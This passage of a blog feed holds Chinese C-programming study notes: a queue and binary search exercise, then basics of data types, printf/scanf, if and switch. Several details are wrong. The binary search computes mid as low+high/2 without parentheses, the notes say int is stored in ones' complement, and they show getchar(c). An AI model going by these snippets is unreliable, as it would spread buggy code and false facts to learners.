 ppQ= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k,flag;</span><br><span class="line">    LinkQueue *pQ= <span class="literal">NULL</span>;</span><br><span class="line">    InitQueue(&amp;pQ);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;k);</span><br><span class="line">    <span class="keyword">while</span>(k != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        EnQueue(pQ,k);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(QueueIsEmpty(pQ) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DeQueue(pQ,&amp;k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="46-二分查找"><a href="#46-二分查找" class="headerlink" title="46 二分查找"></a>46 二分查找</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入<span class="number">10</span>个单调递增的数：<span class="number">5</span> <span class="number">10</span> <span class="number">13</span> <span class="number">18</span> <span class="number">20</span> <span class="number">24</span> <span class="number">27</span> <span class="number">31</span> <span class="number">33</span> <span class="number">39</span></span><br><span class="line">要查找的数：<span class="number">20</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span>在<span class="number">4</span>位置</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> n,<span class="keyword">int</span> key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>],i,pos,key;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入10个单调递增的数："</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"要查找的数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;key);</span><br><span class="line">    pos=BinarySearch(a,<span class="number">10</span>,key);</span><br><span class="line">    <span class="keyword">if</span>(pos==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"找不要要查找的数\n"</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d在%d位置\n"</span>,key,pos);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> n,<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> low,high,mid;</span><br><span class="line">    low=<span class="number">0</span>;high=n<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">        mid=low+high/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&lt;key)&#123;</span><br><span class="line">            low=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[mid]&gt;key)&#123;</span><br><span class="line">            high=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/mrbourne/category_1925119.html" target="_blank" rel="noopener">https://blog.csdn.net/mrbourne/category_1925119.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-加法器与累乘器&quot;&gt;&lt;a href=&quot;#1-加法器与累乘器&quot; class=&quot;headerlink&quot; title=&quot;1 加法器与累乘器&quot;&gt;&lt;/a&gt;1 加法器与累乘器&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;代码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;累加器&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; sum=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;i&amp;lt;=&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sum=sum+i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%d.\n&quot;&lt;/span&gt;,sum);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Code" scheme="https://jlkl.github.io/tags/Code/"/>
    
      <category term="C/C++" scheme="https://jlkl.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>C语言基础</title>
    <link href="https://jlkl.github.io/2020/01/26/C_C++_01/"/>
    <id>https://jlkl.github.io/2020/01/26/C_C++_01/</id>
    <published>2020-01-26T06:56:49.000Z</published>
    <updated>2020-04-05T07:19:57.047Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大一学习的 C 语言，现在回过头来发现已经忘的差不多了，正好趁着这个机会复习整理下，本文的目的偏向于整理备忘，讲解的部分会占很少。</p><p>目录及相关习题参考 《C程序设计（第四版）》谭浩强</p><a id="more"></a><h2 id="1-算法表示"><a href="#1-算法表示" class="headerlink" title="1 算法表示"></a>1 算法表示</h2><h3 id="1-1-常见流程图"><a href="#1-1-常见流程图" class="headerlink" title="1.1 常见流程图"></a>1.1 常见流程图</h3><p><img src="/2020/01/26/C_C++_01/20200218141916.png" alt></p><p>当型循环</p><p><img src="/2020/01/26/C_C++_01/20200218142137.png" alt></p><p>直到型循环</p><p><img src="/2020/01/26/C_C++_01/20200218142225.png" alt></p><h3 id="1-2-NS-流程图"><a href="#1-2-NS-流程图" class="headerlink" title="1.2 NS 流程图"></a>1.2 NS 流程图</h3><p><img src="/2020/01/26/C_C++_01/20200218142328.png" alt></p><h3 id="伪代码表示"><a href="#伪代码表示" class="headerlink" title="伪代码表示"></a>伪代码表示</h3><p><img src="/2020/01/26/C_C++_01/20200218142508.png" alt></p><h2 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2 数据类型"></a>2 数据类型</h2><p><img src="/2020/01/26/C_C++_01/20200218142928.png" alt></p><h3 id="2-1-整型数据"><a href="#2-1-整型数据" class="headerlink" title="2.1 整型数据"></a>2.1 整型数据</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）普通整型（<span class="built_in">int</span>），存储单元中使用反码形式存放</span><br><span class="line"><span class="number">2</span>字节 <span class="number">-32768</span>~<span class="number">32767</span> 或 <span class="number">4</span>字节 <span class="number">-2147483648</span>~<span class="number">2147483647</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）短整型（short <span class="built_in">int</span> 或 short），同反码存储</span><br><span class="line">vc6<span class="number">.0</span> <span class="built_in">int</span> <span class="number">4</span> 字节，short <span class="built_in">int</span> <span class="number">2</span> 字节</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）长整型（long <span class="built_in">int</span> 或 long）</span><br><span class="line">vc6<span class="number">.0</span> long <span class="number">4</span> 字节</span><br><span class="line"></span><br><span class="line">（<span class="number">4</span>）双长整型（long long <span class="built_in">int</span>）</span><br><span class="line">一般 <span class="number">8</span> 字节</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200218144559.png" alt></p><p>有符号数据 0 正 1 负，默认为有符号数据</p><h3 id="2-2-字符型数据"><a href="#2-2-字符型数据" class="headerlink" title="2.2 字符型数据"></a>2.2 字符型数据</h3><p>一字节</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">char c</span> = <span class="string">'?'</span>;</span><br></pre></td></tr></table></figure><p>==注意==</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'A'</span> 表示一个字符</span><br><span class="line"><span class="string">"A"</span> 表示一个字符串，后面还有一个 <span class="string">\0</span></span><br></pre></td></tr></table></figure><h3 id="2-3-浮点型数据"><a href="#2-3-浮点型数据" class="headerlink" title="2.3 浮点型数据"></a>2.3 浮点型数据</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">单精度浮点型（<span class="keyword">float</span>），双精度浮点型（<span class="keyword">double</span>），长双精度（<span class="keyword">long</span> <span class="keyword">double</span>）</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200218145252.png" alt></p><h3 id="2-4-赋值过程中类型转换"><a href="#2-4-赋值过程中类型转换" class="headerlink" title="2.4 赋值过程中类型转换"></a>2.4 赋值过程中类型转换</h3><p>因为 C 是强类型语言，如赋值语句两侧变量类型不相同则会进行转换</p><p>==注意==</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"%f<span class="subst">\n</span>"</span>, <span class="number">1</span>/<span class="number">3</span>);    <span class="comment">//输出 0.000000，因为 1/3 结果为整型 0</span></span><br><span class="line"></span><br><span class="line">printf(<span class="string">"%f<span class="subst">\n</span>"</span>, <span class="number">1.0</span>/<span class="number">3</span>);  <span class="comment">//正确方法，输出 0.333333</span></span><br></pre></td></tr></table></figure><h3 id="2-5-强制类型转换"><a href="#2-5-强制类型转换" class="headerlink" title="2.5 强制类型转换"></a>2.5 强制类型转换</h3><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(double)a</span><br><span class="line">(int)(<span class="symbol">x</span>+<span class="symbol">y</span>)</span><br><span class="line">int(<span class="symbol">x</span>)+<span class="symbol">y</span>    <span class="comment">//只将 x 转为整型</span></span><br></pre></td></tr></table></figure><h2 id="3-C-语言注释"><a href="#3-C-语言注释" class="headerlink" title="3 C 语言注释"></a>3 C 语言注释</h2><p>两种注释方式</p><ul><li>块注释（block comment）：以 <code>/*</code> 开始，<code>*/</code> 结束</li><li>行注释（line comment）：以 <code>//</code> 开始</li></ul><h2 id="4-数据的输入输出"><a href="#4-数据的输入输出" class="headerlink" title="4 数据的输入输出"></a>4 数据的输入输出</h2><h3 id="4-1-printf-输出数据"><a href="#4-1-printf-输出数据" class="headerlink" title="4.1 printf 输出数据"></a>4.1 printf 输出数据</h3><h4 id="4-1-1-一般格式"><a href="#4-1-1-一般格式" class="headerlink" title="4.1.1 一般格式"></a>4.1.1 一般格式</h4><p>语法：<code>printf(格式字符, 输出变量);</code></p><p>example: <code>printf(&quot;%d,%c\n&quot;,i,c);    //  注意是双引号</code></p><h4 id="4-1-2-格式字符"><a href="#4-1-2-格式字符" class="headerlink" title="4.1.2 格式字符"></a>4.1.2 格式字符</h4><p><img src="/2020/01/26/C_C++_01/20200218151821.png" alt></p><p>修饰字符</p><p><img src="/2020/01/26/C_C++_01/20200218151916.png" alt></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%m.nf   指定数据的宽度和小数位数，m 包含小数点</span><br><span class="line"></span><br><span class="line">printf(<span class="string">"%6.3f<span class="subst">\n</span>"</span>, <span class="number">1.0</span>/<span class="number">3</span>);   <span class="comment">//输出 0.333</span></span><br><span class="line">printf(<span class="string">"%06.3f<span class="subst">\n</span>"</span>, <span class="number">1.0</span>/<span class="number">3</span>);  <span class="comment">//输出00.333    宽度不够 0 凑位</span></span><br></pre></td></tr></table></figure><h3 id="4-2-scanf-输入数据"><a href="#4-2-scanf-输入数据" class="headerlink" title="4.2 scanf 输入数据"></a>4.2 scanf 输入数据</h3><h4 id="4-2-1-一般形式"><a href="#4-2-1-一般形式" class="headerlink" title="4.2.1 一般形式"></a>4.2.1 一般形式</h4><p>语法：<code>scanf(格式字符, 地址表列);</code></p><p>example: <code>scanf(&quot;a=%f,b=%f,c=%f&quot;, &amp;a, &amp;b, &amp;c);  //1. 双引号 2. 注意是地址 &amp;a</code></p><h4 id="4-2-2-格式字符"><a href="#4-2-2-格式字符" class="headerlink" title="4.2.2 格式字符"></a>4.2.2 格式字符</h4><p><img src="/2020/01/26/C_C++_01/20200219150544.png" alt></p><p>==注意==</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）</span><br><span class="line"><span class="keyword">double</span> 类型数据</span><br><span class="line"><span class="built_in">scanf</span> 时格式字符使用 %lf</span><br><span class="line"><span class="built_in">printf</span> 时格式字符使用 %f</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）</span><br><span class="line"><span class="built_in">scanf</span> 时，遇空格，回车，tab或遇到非法字符（如输入数字时遇到字符）则认为该数据结束</span><br></pre></td></tr></table></figure><h3 id="4-3-字符数据的输入输出"><a href="#4-3-字符数据的输入输出" class="headerlink" title="4.3 字符数据的输入输出"></a>4.3 字符数据的输入输出</h3><p>putchar 输出一个字符</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putchar(<span class="name">c</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>getchar 输入一个字符</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getchar(<span class="name">c</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><blockquote><p>getchar 还可以获取屏幕上无法显示的字符，如控制字符</p></blockquote><h3 id="4-4-习题（第三章）"><a href="#4-4-习题（第三章）" class="headerlink" title="4.4 习题（第三章）"></a>4.4 习题（第三章）</h3><p><img src="/2020/01/26/C_C++_01/20200219152725.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//math 库 pow 函数应用</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> r, p;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    r = <span class="number">0.09</span>;</span><br><span class="line">    n = <span class="number">10</span>;</span><br><span class="line">    p = <span class="built_in">pow</span>((<span class="number">1</span>+r), n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200219153341.png" alt></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利息计算</span></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    double P1, P2, P3, P4, P5;</span><br><span class="line">    </span><br><span class="line">    P1 = <span class="number">1000</span>*(<span class="number">1</span>+<span class="number">5</span>*<span class="number">0.0585</span>);</span><br><span class="line">    P2 = (<span class="number">1000</span>*(<span class="number">1</span>+<span class="number">2</span>*<span class="number">0.0468</span>))*(<span class="number">1</span>+<span class="number">3</span>*<span class="number">0.054</span>);</span><br><span class="line">    P3 = (<span class="number">1000</span>*(<span class="number">1</span>+<span class="number">3</span>*<span class="number">0.054</span>))*(<span class="number">1</span>+<span class="number">2</span>*<span class="number">0.0468</span>);</span><br><span class="line">    P4 = <span class="number">1000</span>*pow(<span class="number">1</span>+<span class="number">0.0414</span>, <span class="number">5</span>);</span><br><span class="line">    P5 = <span class="number">1000</span>*pow(<span class="number">1</span>+<span class="number">0.0072</span>/<span class="number">4</span>, <span class="number">5</span>*<span class="number">4</span>);</span><br><span class="line">    </span><br><span class="line">    printf(<span class="string">"%f<span class="subst">\n</span>%f<span class="subst">\n</span>%f<span class="subst">\n</span>%f<span class="subst">\n</span>%f<span class="subst">\n</span>"</span>, P1, P2, P3, P4, P5);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200219160608.png" alt></p><p>==注意==</p><p>第二问，char 存储为一字节，按补码形式存储</p><p><img src="/2020/01/26/C_C++_01/20200219160838.png" alt></p><p><img src="/2020/01/26/C_C++_01/20200219161446.png" alt></p><p>==注意==</p><p>scanf 时，遇空格，回车，tab或遇到非法字符（如输入数字时遇到字符）则认为该数据结束</p><p>所以 71.82 和 Aa 之间不应有空格或回车</p><p><img src="/2020/01/26/C_C++_01/20200219161709.png" alt></p><h2 id="5-选择结构程序设计"><a href="#5-选择结构程序设计" class="headerlink" title="5 选择结构程序设计"></a>5 选择结构程序设计</h2><h3 id="5-1-if-语句实现选择结构"><a href="#5-1-if-语句实现选择结构" class="headerlink" title="5.1 if 语句实现选择结构"></a>5.1 if 语句实现选择结构</h3><p>一般有两种形式</p><p>（1）</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">    <span class="attr">c</span> = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="attr">c</span> = b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(number&gt;<span class="number">500</span>)&#123;</span><br><span class="line">    cost = <span class="number">0.15</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(number&gt;<span class="number">300</span>)&#123;</span><br><span class="line">    cost = <span class="number">0.075</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    cost = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==注意==</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无花括号时，if 条件为真，只会执行之后的一条语句</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"11111111111\n"</span>);  <span class="comment">// 这两条都会打印</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"11111111111\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"11111111111\n"</span>); <span class="comment">// 只有这一条不会打印</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"22222222222\n"</span>); <span class="comment">// 以下两条都会打印</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"22222222222\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-关系运算符及优先次序"><a href="#5-2-关系运算符及优先次序" class="headerlink" title="5.2 关系运算符及优先次序"></a>5.2 关系运算符及优先次序</h3><p><img src="/2020/01/26/C_C++_01/20200223140008.png" alt><br>优先次序<br><img src="/2020/01/26/C_C++_01/20200223140044.png" alt></p><h3 id="5-3-逻辑运算符及优先次序"><a href="#5-3-逻辑运算符及优先次序" class="headerlink" title="5.3 逻辑运算符及优先次序"></a>5.3 逻辑运算符及优先次序</h3><p><img src="/2020/01/26/C_C++_01/20200223140127.png" alt><br>优先次序，!(非)最高<br><img src="/2020/01/26/C_C++_01/20200223140405.png" alt></p><h3 id="5-4-条件表达式"><a href="#5-4-条件表达式" class="headerlink" title="5.4 条件表达式"></a>5.4 条件表达式</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ch</span>=(ch&gt;=<span class="string">'A'</span> &amp;&amp; ch&lt;=<span class="string">'Z'</span>)?(ch+<span class="number">32</span>):ch<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="5-5-switch-语句"><a href="#5-5-switch-语句" class="headerlink" title="5.5 switch 语句"></a>5.5 switch 语句</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(grade)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'A'</span>: <span class="built_in">printf</span>(<span class="string">"85~100\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'B'</span>: <span class="built_in">printf</span>(<span class="string">"70~84\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'C'</span>: <span class="built_in">printf</span>(<span class="string">"60~69\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'D'</span>: <span class="built_in">printf</span>(<span class="string">"&lt;60\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">"enter datda error!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意每次需要用 break 跳出语句，不然后一直往下运行</span></span><br></pre></td></tr></table></figure><h3 id="5-6-习题（第四章）"><a href="#5-6-习题（第四章）" class="headerlink" title="5.6 习题（第四章）"></a>5.6 习题（第四章）</h3><p><img src="/2020/01/26/C_C++_01/20200223145200.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 